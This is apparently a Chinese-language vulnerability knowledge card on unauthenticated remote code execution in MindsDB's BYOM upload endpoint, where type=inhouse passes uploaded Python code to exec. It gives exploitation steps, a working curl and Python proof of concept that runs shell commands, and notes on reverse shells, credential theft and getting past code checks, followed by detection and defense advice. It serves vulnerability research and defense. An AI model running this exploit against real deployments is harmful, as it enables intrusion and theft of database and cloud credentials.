---
id: ai-security-agent-security-mindsdb-byom-unauth-code-exec
title: MindsDB BYOM 未认证 PUT 上传 Python 代码：type=inhouse 经 exec 在当前进程执行
type: scenario
domain: ai-security
path: ai-security/agent-security
technique: mindsdb-byom-unauth-code-exec
aliases:
- MindsDB BYOM RCE
- MindsDB 未授权 RCE
- CreateMLEngine
- ModelWrapperUnsafe
- import_string exec
- inhouse 执行
tags:
- ai-security
- mindsdb
- byom
- rce
- unauthenticated
- exec
- python
- http-api
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: v25.11.0
verification:
  verified_by: verifier-V162
  verified_at: '2026-11-06T09:47:26+08:00'
  notes: 已对照原文与3张图核对：PUT /api/handlers/byom/<name> 无认证、prepare_formdata 仅校验 basename/字段名、type=inhouse 经 ModelWrapperUnsafe→import_string→exec(code) 执行、结构检查只找 train/predict 类，均与原文一致；图01 Engine already exists、图02 /tmp/pwned.txt 的 id 输出、图03 一键脚本 PWNED whoami 输出均为实测截图。affected_versions 保留 v25.11.0：原文明确 git checkout 的漏洞版本且实测，原文未给完整影响区间/修复版本，卡内已注明‘原文复现版本’。未验证点：PoC 未在本机复跑；不同部署的认证中间件/隔离 type 可能影响利用。
---

## 一句话结论

MindsDB 的 BYOM（Bring Your Own Model）HTTP 接口 `PUT /api/handlers/byom/<name>` 默认没有认证检查；它把上传的 `code` 文件写入临时目录后，以 `type=inhouse` 交给 `ModelWrapperUnsafe`，最终在 `import_string()` 中执行 `exec(code, module.__dict__)`。攻击者只需一个 multipart PUT 请求，就能在当前 MindsDB 进程上下文执行任意 Python 代码（含 `subprocess`/文件读写），无需预先在服务器放文件。

## 原理

- **未认证入口**：`BYOMUpload.put(name)` 直接调用 `prepare_formdata()`，没有 token/session/角色校验；默认 HTTP API 暴露在 47334 时任何可达用户都能上传。
- **文件处理**：`prepare_formdata()` 只校验文件名 basename（禁止路径穿越）与字段名 `code`/`modules`，然后把上传内容写入 `tempfile.mkdtemp(prefix="mindsdb_file_")` 下的临时文件，返回路径。
- **inhouse 执行路径**：`connection_args = {"code": code_file_path, "modules": module_file_path, "type": params.get("type")}`；当 `type=inhouse` 时，`CreateMLEngine` → `integration_controller.add()` → `byom_handler.create_engine()` → `_get_model_proxy()` → `ModelWrapperUnsafe.__init__()` → `import_string(code)`。
- **exec sink**：`import_string()` 创建 `types.ModuleType`，执行 `exec(code, module.__dict__)`；用户代码的顶层语句（导入、命令执行、文件写入）在上传/创建引擎阶段立即执行，甚至不依赖后续训练/预测。
- **结构检查不查内容**：`check_module()`/`find_model_class()` 只要求代码里存在带 `train`/`predict` 的类，并实例化它；不会做 AST/危险 API 检查，因此恶意顶层代码与合法模型类可以共存。
- **为何是 RCE 而非 SSRF/文件写**：代码在 MindsDB 主进程内执行，继承其文件系统、网络、环境变量与数据库凭据；可直接 `subprocess.run`、`os.system`、读 `/etc/passwd`、连内部服务。

## 触发条件

- MindsDB HTTP API 可达（默认 `:47334`），BYOM 功能开启；目标版本为 `v25.11.0`（原文复现版本）。
- 未配置认证/反向代理鉴权，或 BYOM 路由未纳入认证中间件；默认配置即可。
- 攻击者能发送 multipart PUT，字段包含 `code`、`modules`，`type=inhouse`。
- 目标进程有执行 Python 代码所需的权限（通常为 MindsDB 运行用户，可能是容器内 root）。

## 利用步骤

1. **准备恶意模型文件**：编写 `model.py`，顶层执行命令/写文件，同时定义含 `train`/`predict` 的 `MyModel` 类，满足结构检查。
2. **准备 requirements**：`requirements.txt` 可只写 `pandas` 等合法依赖，避免安装阶段报错。
3. **发送 PUT**：`PUT /api/handlers/byom/<name>`，multipart 字段 `code=@model.py`、`modules=@requirements.txt`、`type=inhouse`。
4. **代码立即执行**：MindsDB 创建引擎时调用 `exec`，顶层命令执行；若引擎名已存在会返回 “Engine already exists”，换一个 name 即可。
5. **验证**：读取命令输出文件（示例 `/tmp/pwned.txt`），或建立反弹 shell/写 WebShell。
6. **横向**：读取环境变量/配置中的数据库凭据、内部 API token，访问内网服务。

## PoC

```bash
curl -X PUT http://127.0.0.1:47334/api/handlers/byom/pwned \
  -F 'code=@model.py' \
  -F 'modules=@requirements.txt' \
  -F 'type=inhouse'
```

```python
# model.py：顶层副作用 + 合法模型结构
import os, subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
open('/tmp/pwned.txt', 'w').write('PWNED: ' + result.stdout)

class MyModel:
    def train(self, df, target, args=None):
        return self
    def predict(self, df, args=None):
        return df
```

```python
# 一键复现
import requests, time
CODE = """import os, subprocess
result = subprocess.run(['whoami'], capture_output=True, text=True)
open('/tmp/pwned.txt', 'w').write('PWNED: ' + result.stdout)
class MyModel:
    def train(self, df, target, args=None): return self
    def predict(self, df, args=None): return df
"""
files = {
    'code': ('model.py', CODE, 'text/plain'),
    'modules': ('requirements.txt', 'pandas\n', 'text/plain'),
}
r = requests.put("http://127.0.0.1:47334/api/handlers/byom/11",
                 files=files, data={'type': 'inhouse'})
print(r.text)
time.sleep(1)
print(open('/tmp/pwned.txt').read())
```

原文在 MindsDB v25.11.0 本地环境验证了 `whoami`/`id` 写入 `/tmp/pwned.txt`；本卡不执行 PoC。

## 变体与关联

- **其它 BYOM type**：`inhouse` 在当前进程执行；其它 type 可能走 Docker/远程引擎，隔离性不同；攻击者优先选择 inhouse。
- **其它 AI 平台代码上传**：Langflow/Letta/Dify 等也有自定义代码/组件执行面；关键是“上传代码 + 服务端 exec/import”且认证缺失。
- **绕过结构检查**：把恶意代码放在顶层或类属性/装饰器中，保留 `train`/`predict` 即可；若未来加入 AST 检查，可用动态导入/编码绕过。
- **关联**：[[ai-security-agent-security-crewai-sandboxpython-dunder-subclasses-builtins-escape]]（AI 工具沙箱逃逸）、[[ai-security-agent-security-letta-tools-run-unauth-code-exec]]（未授权代码执行）、[[ai-security-agent-security-langflow-build-public-tmp-data-code-exec]]（公开端点代码执行）。
- **边界**：如果 BYOM 路由启用了认证、API 仅监听 localhost/内网且不可达、或 `type` 被强制为隔离模式，利用失败；版本可能已修复。

## 检测与防御

- **认证与授权**：所有 `/api/handlers/byom/*` 路由强制认证与角色校验；默认拒绝未认证请求；不要把 MindsDB API 直接暴露公网。
- **隔离执行**：BYOM 代码在独立容器/沙箱中执行，限制文件系统、网络、环境变量与数据库凭据；不要在主进程 `exec` 用户代码。
- **代码审核**：AST 白名单/危险 API 扫描（subprocess/os.system/eval/exec/__import__/pickle 等）只能作为纵深，不能替代隔离。
- **检测**：PUT `/api/handlers/byom/` 的异常上传、顶层代码含 subprocess/os.system、MindsDB 进程派生 shell、写入 `/tmp` 的可疑文件、异常外联；监控 47334 端口的暴露。
- **响应**：升级 MindsDB、轮换其环境中的数据库/云凭据、隔离实例、审计是否已有恶意模型/引擎。
